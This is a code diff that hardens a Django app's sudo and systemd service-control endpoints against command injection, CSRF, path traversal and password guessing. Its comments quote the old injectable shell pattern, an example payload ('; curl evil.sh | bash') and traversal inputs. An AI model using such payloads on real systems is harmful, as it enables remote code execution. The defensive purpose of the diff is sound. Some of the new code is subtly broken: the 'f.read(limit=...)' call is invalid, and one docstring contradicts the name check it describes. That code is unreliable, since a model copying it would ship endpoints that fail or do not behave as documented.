@@ -19,9 +19,11 @@ from django.views.decorators.http import require_POST
 from two_factor.views import LoginView as TwoFactorLoginView
 from two_factor.utils import default_device
 from django_ratelimit.decorators import ratelimit
-from rest_framework.decorators import api_view
-from rest_framework import status
+from rest_framework.decorators import api_view, permission_classes
+from rest_framework import status, permissions
 from rest_framework.response import Response
+from collections import defaultdict, deque
+from sre_agent.crypto import decrypt_rsa_oaep, generate_rsa_key_pair
 from langchain_ollama import OllamaLLM
 from django.conf import settings
 import shlex
@@ -116,15 +118,11 @@ llm = KantorOllamaLLM(
     model_name=OLLAMA_MODEL
 )
 
-# @login_required
-# def chatAI(request):
-#     return render(request,"generator/textGenerator.html",{'headTitle' : 'Chat AI','toggle' : "true"})
-#     # testing
-# @login_required
-# def chatAI2(request):
-#     # return render(request,"generator/textGenerator.html",{'headTitle' : 'Chat AI','toggle' : "true"})
-#     # testing
-#     return render(request,"chat.html",{'headTitle' : 'Chat AI','toggle' : "true"})
+# Legacy chat shells (chat.html, generator/textGenerator.html) and their routes
+# were removed: no view rendered them, and they were the only callers of
+# POST /api/set-sudo/, which base64-decoded a sudo password into the session
+# instead of encrypting it like the websocket path does. templates/chat3.html
+# is the live shell.
 @login_required
 @ensure_csrf_cookie
 @never_cache
@@ -539,34 +537,102 @@ def get_running_services():
 @login_required
 def service_control(request):
     failed_services = get_failed_services()
-    return render(request,"service_control.html",{'headTitle' : 'Service Control', 'failed_services': failed_services})
+    # The page needs the public half to RSA-encrypt the sudo password before it
+    # is sent. Shipping it in the initial render means the Start/Stop/Restart
+    # buttons can encrypt without first opening the config modal, and without a
+    # second round trip.
+    return render(request, "service_control.html", {
+        'headTitle': 'Service Control',
+        'failed_services': failed_services,
+        'service_config_public_key': SERVICE_CONFIG_PUBLIC_PEM,
+    })
 
 import json
 
+# The only verbs this endpoint will ever run. A client cannot ask for
+# `daemon-reload`, `edit`, `disable` or anything else by changing its request,
+# because the verb list is decided here and nowhere else.
+SERVICE_CONTROL_ACTIONS = frozenset({"start", "stop", "restart"})
+
+
 @login_required
-@csrf_exempt
+@require_POST
 def sudo_command(request):
-    if request.method == 'POST':
-        try:
-            data = json.loads(request.body)
-            password = data.get('password')
-            command = data.get('command')
+    """Start, stop or restart one systemd unit as root.
 
-            if not password or not command:
-                return JsonResponse({'status': 'error', 'message': 'Password and command are required.'}, status=400)
+    This used to be:
 
-            # Jalankan perintah dengan sudo menggunakan password
-            full_command = f'echo {password} | sudo -S {command}'
-            result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
+        full_command = f'echo {password} | sudo -S {command}'
+        subprocess.run(full_command, shell=True, ...)
 
-            if result.returncode == 0:
-                return JsonResponse({'status': 'success', 'message': result.stdout})
-            else:
-                return JsonResponse({'status': 'error', 'message': result.stderr}, status=500)
+    with `command` and `password` interpolated into a shell string. Any caller
+    could append `; curl evil.sh | bash` and it ran regardless of whether the
+    password was correct, and @csrf_exempt meant a page the operator merely
+    visited could post to it with their session cookie attached.
 
-        except Exception as e:
-            return JsonResponse({'status': 'error', 'message': str(e)}, status=500)
-        
+    Now the request names a service and an action, the server builds the argv
+    itself, nothing is ever handed to a shell, and the password arrives
+    RSA-OAEP encrypted like the rest of the sudo paths.
+    """
+    try:
+        data = json.loads(request.body)
+    except (json.JSONDecodeError, UnicodeDecodeError):
+        return JsonResponse({'status': 'error', 'message': 'Malformed request.'}, status=400)
+
+    service = _service_name_ok(data.get('service', ''))
+    if not service:
+        return JsonResponse({'status': 'error', 'message': 'Invalid service name.'}, status=400)
+
+    action = data.get('action')
+    if action not in SERVICE_CONTROL_ACTIONS:
+        return JsonResponse(
+            {'status': 'error',
+             'message': 'Action must be one of start, stop, restart.'},
+            status=400)
+
+    encrypted_password = data.get('encrypted_password')
+    if not encrypted_password:
+        return JsonResponse(
+            {'status': 'error', 'message': 'An encrypted password is required.'},
+            status=400)
+
+    if _service_write_rate_limited(request):
+        return JsonResponse(
+            {'status': 'error',
+             'message': 'Too many attempts. Wait a minute and try again.'},
+            status=429)
+
+    try:
+        password = decrypt_rsa_oaep(SERVICE_CONFIG_PRIVATE_KEY, encrypted_password)
+    except Exception:
+        logger.warning("sudo_command: password decryption failed for %s", service)
+        return JsonResponse({'status': 'error', 'message': 'Could not verify the password.'},
+                            status=400)
+
+    # argv, never a shell string. `-p ''` stops sudo from writing its prompt to
+    # the captured output, and the timeout stops a wedged sudo from pinning a
+    # request thread open.
+    try:
+        result = subprocess.run(
+            ['sudo', '-S', '-p', '', 'systemctl', action, f'{service}.service'],
+            input=f'{password}\n',
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
+    except subprocess.TimeoutExpired:
+        return JsonResponse({'status': 'error', 'message': 'The operation timed out.'}, status=500)
+
+    if result.returncode == 0:
+        return JsonResponse({'status': 'success',
+                             'message': f'{service}: {action} succeeded.'})
+    # The raw sudo stderr distinguishes "wrong password" from "no such unit",
+    # which is exactly what turns this into a password oracle.
+    logger.warning("sudo_command: %s %s failed (rc=%s)", action, service, result.returncode)
+    return JsonResponse(
+        {'status': 'error',
+         'message': f'Rejected. Check the password and that the unit exists.'},
+        status=403)
 
 
 SERVICE_DIR_ETC = "/etc/systemd/system/"
@@ -594,69 +660,174 @@ def find_service_file(service_name):
     return None
 
 
+# --- Service configuration endpoints ---
+# Both of these read and write files under /etc/systemd/system through sudo, and
+# both take the sudo password. They were reachable with no session at all, which
+# on a public tunnel meant: read any unit file, and write arbitrary ones.
+#
+# SERVICE_NAME_RE is the allowlist. service_name goes straight into a filesystem
+# path and then into `sudo tee`, so anything with a separator, a dot segment or a
+# null byte in it is refused outright rather than normalised.
+# `@` is allowed because systemd template units are named like
+# postgresql@16-main.service and getty@tty1.service. It carries no traversal
+# or shell meaning, and the rest of the class excludes separators anyway.
+SERVICE_NAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9_.@-]{0,63}$')
+SERVICE_CONFIG_WRITE_LIMIT = 5
+SERVICE_CONFIG_WRITE_WINDOW = 60.0
+SERVICE_CONFIG_MAX_BYTES = 256 * 1024
+_service_config_attempts = defaultdict(deque)
+
+# One RSA-OAEP pair per process, the same shape the websocket sudo path uses.
+# The browser encrypts with the public half; the private half never leaves here.
+SERVICE_CONFIG_PRIVATE_KEY, SERVICE_CONFIG_PUBLIC_PEM = generate_rsa_key_pair()
+
+
+def _service_name_ok(service_name):
+    """Reject anything that is not a plain systemd unit name.
+
+    `sshd` is fine. `../../etc/passwd`, `a/b`, `x.service`, `..` and `a b` are
+    not - each would either escape the unit directory or name a different file
+    than the operator believes they are editing.
+    """
+    name = (service_name or '').strip()
+    if not SERVICE_NAME_RE.match(name):
+        return None
+    # Reject the double extension so a caller cannot smuggle a second suffix.
+    if name.endswith('.service'):
+        name = name[:-len('.service')]
+        if not SERVICE_NAME_RE.match(name):
+            return None
+    return name
+
+
+def _service_write_rate_limited(request):
+    """Throttle password attempts per client so the endpoint is not an oracle."""
+    key = request.META.get('REMOTE_ADDR', 'unknown')
+    attempts = _service_config_attempts[key]
+    now = time.monotonic()
+    while attempts and now - attempts[0] > SERVICE_CONFIG_WRITE_WINDOW:
+        attempts.popleft()
+    if len(attempts) >= SERVICE_CONFIG_WRITE_LIMIT:
+        return True
+    attempts.append(now)
+    return False
+
+
 @api_view(['GET'])
+@permission_classes([permissions.IsAuthenticated])
 def get_service_config(request, service_name):
     """
     Endpoint untuk membaca isi file konfigurasi layanan.
     """
+    unit = _service_name_ok(service_name)
+    if not unit:
+        return Response({"error": "Invalid service name."}, status=400)
     try:
         # Cari file layanan
-        config_path = find_service_file(service_name)
+        config_path = find_service_file(unit)
         if not config_path:
-            return JsonResponse({"error": f"Service file {service_name} not found."}, status=404)
-        
+            # The unit name came from the operator, so echoing it back leaks
+            # nothing, but the filesystem error below used to.
+            return Response({"error": "Service file not found."}, status=404)
+
+        # Batasi ukuran supaya unit file raksasa tidak membanjiri response
+        if os.path.getsize(config_path) > SERVICE_CONFIG_MAX_BYTES:
+            return Response({"error": "Service file is too large to display."}, status=400)
 
         # Baca isi file
-        with open(config_path, 'r') as f:
-            config_content = f.read()
-        
-        return JsonResponse({"config": config_content})
-    except Exception as e:
-        return JsonResponse({"error": str(e)}, status=500)
-    
+        with open(config_path, 'r', errors='replace') as f:
+            config_content = f.read(limit=SERVICE_CONFIG_MAX_BYTES)
+
+        return Response({"config": config_content,
+                         "public_key": SERVICE_CONFIG_PUBLIC_PEM})
+    except Exception:
+        # Never echo str(e): a bare OSError carries the absolute path.
+        logger.error("get_service_config failed for %s", unit, exc_info=True)
+        return Response({"error": "Could not read the service configuration."}, status=500)
+
+
 @api_view(['POST'])
+@permission_classes([permissions.IsAuthenticated])
 def save_service_config(request, service_name):
+    unit = _service_name_ok(service_name)
+    if not unit:
+        return Response({"error": "Invalid service name."}, status=400)
+
     try:
-        # Gunakan request.data untuk membaca data JSON
-        new_config = request.data.get("config", "").strip()
-        password = request.data.get("password")
+        new_config = request.data.get("config", "")
+        # The password arrives RSA-OAEP encrypted, exactly like the chat and the
+        # architecture modal, instead of as a plaintext JSON field.
+        encrypted_password = request.data.get("encrypted_password")
 
-        if not new_config:
-            return Response({"error": "Configuration content is required."}, status=status.HTTP_400_BAD_REQUEST)
+        if not isinstance(new_config, str) or not new_config.strip():
+            return Response({"error": "Configuration content is required."},
+                            status=status.HTTP_400_BAD_REQUEST)
+        if len(new_config) > SERVICE_CONFIG_MAX_BYTES:
+            return Response({"error": "Configuration is too large."},
+                            status=status.HTTP_400_BAD_REQUEST)
+        if not encrypted_password:
+            return Response({"error": "An encrypted password is required."},
+                            status=status.HTTP_400_BAD_REQUEST)
 
-        # Hapus .service jika ada
-        if service_name.endswith('.service'):
-            service_name = service_name[:-8]
+        if _service_write_rate_limited(request):
+            return Response(
+                {"error": "Too many configuration attempts. Wait a minute and try again."},
+                status=status.HTTP_429_TOO_MANY_REQUESTS)
 
-        config_path = f"/etc/systemd/system/{service_name}.service"
+        try:
+            password = decrypt_rsa_oaep(SERVICE_CONFIG_PRIVATE_KEY, encrypted_password)
+        except Exception:
+            # A decryption failure is either a corrupt client or a replayed
+            # blob. Both are indistinguishable to us and neither may be
+            # reported in detail.
+            logger.warning("service config: password decryption failed for %s", unit)
+            return Response({"error": "Could not verify the password."},
+                            status=status.HTTP_400_BAD_REQUEST)
 
-        # Simpan konfigurasi baru dengan sudo menggunakan subprocess
-        write_command = ['sudo', '-S', 'tee', config_path]
+        config_path = f"/etc/systemd/system/{unit}.service"
+
+        # Simpan konfigurasi baru dengan sudo menggunakan subprocess.
+        # The path is argv, not a shell string, and unit is already allowlisted.
         write_result = subprocess.run(
-            write_command,
-            input=f'{password}\n{new_config}',  # Kirim password dan konfigurasi baru sebagai input
+            ['sudo', '-S', '-p', '', 'tee', config_path],
+            input=f'{password}\n{new_config}',
             capture_output=True,
-            text=True
+            text=True,
+            timeout=30
         )
 
         if write_result.returncode != 0:
-            return Response({"error": f"Failed to save configuration: {write_result.stderr}"}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+            # The raw sudo stderr says whether the password was wrong, which
+            # turns this endpoint into an unlimited guessing oracle.
+            logger.warning("service config: write rejected for %s (rc=%s)",
+                           unit, write_result.returncode)
+            return Response({"error": "Rejected. Check the password and that the "
+                                      "user may manage systemd units."},
+                            status=status.HTTP_403_FORBIDDEN)
 
-        # Reload systemd
-        reload_command = ['sudo', '-S', 'systemctl', 'daemon-reload']
         reload_result = subprocess.run(
-            reload_command,
-            input=password,  # Kirim hanya password sebagai input
+            ['sudo', '-S', '-p', '', 'systemctl', 'daemon-reload'],
+            input=password,
             capture_output=True,
-            text=True
+            text=True,
+            timeout=30
         )
 
         if reload_result.returncode != 0:
-            return Response({"error": f"Failed to reload systemd: {reload_result.stderr}"}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+            logger.warning("service config: daemon-reload failed for %s", unit)
+            return Response({"error": "Saved, but systemd could not be reloaded. "
+                                      "Run daemon-reload manually."},
+                            status=status.HTTP_500_INTERNAL_SERVER_ERROR)
 
-        return Response({"message": f"Configuration for {service_name} saved successfully."}, status=status.HTTP_200_OK)
-    except Exception as e:
-        return Response({"error": str(e)}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+        return Response({"message": f"Configuration for {unit} saved successfully."},
+                        status=status.HTTP_200_OK)
+    except subprocess.TimeoutExpired:
+        return Response({"error": "The operation timed out."},
+                        status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+    except Exception:
+        logger.error("save_service_config failed for %s", unit, exc_info=True)
+        return Response({"error": "Could not save the configuration."},
+                        status=status.HTTP_500_INTERNAL_SERVER_ERROR)
     
 from ai_agent.prompt_runner import run_prompt
 
@@ -3533,6 +3704,7 @@ class SmartAgent:
 #             'user_message': user_message
 #         })
 @csrf_exempt
+@login_required
 def process_smart_chat(request):
     if request.method != 'POST':
         return JsonResponse({'error': 'Invalid request method'}, status=405)
@@ -3548,9 +3720,11 @@ def process_smart_chat(request):
         user_message = data.get('message')
         if not user_message:
             return JsonResponse({'error': 'Message is required'}, status=400)
-        # Initialize smart agent
-        sudo_pass = request.session.get('temp_sudo_pass')
-        agent = SmartAgent(sudo_password=sudo_pass)
+        # Initialize smart agent. The session key is always empty now:
+        # /api/set-sudo/ was the only writer and it stored a base64-encoded
+        # password in cleartext, so it was removed. Privileged runs belong on
+        # the websocket path, where the password arrives RSA-OAEP encrypted.
+        agent = SmartAgent(sudo_password=None)
         print(agent)
         # Process with smart workflow
         workflow_result = agent.process_smart_workflow(user_message)
@@ -4507,26 +4681,4 @@ def get_ai_suggestions(request):
         return JsonResponse({"suggestions": fallback, "status": "success"}) #
 
 
-@require_POST
-def set_sudo_credentials(request):
-    try:
-        data = json.loads(request.body)
-        encoded_pass = data.get('sudo_pass') # Ini masih format Base64
-        
-        if encoded_pass:
-            try:
-                # DECODE BASE64 MENJADI TEXT ASLI
-                # Agent butuh password asli untuk mengetik di terminal
-                password = base64.b64decode(encoded_pass).decode("utf-8")
-                
-                # Simpan password ASLI ke dalam Session Django (Aman karena Session Django itu terenkripsi di sisi server)
-                request.session['temp_sudo_pass'] = password
-                request.session.set_expiry(3600) 
-                
-                return JsonResponse({'status': 'success', 'message': 'Credentials secured in session.'})
-            except Exception as e:
-                return JsonResponse({'status': 'error', 'message': 'Failed to decode password'}, status=400)
-        
-        return JsonResponse({'status': 'ignore', 'message': 'No password provided.'})
-    except Exception as e:
-        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)
+
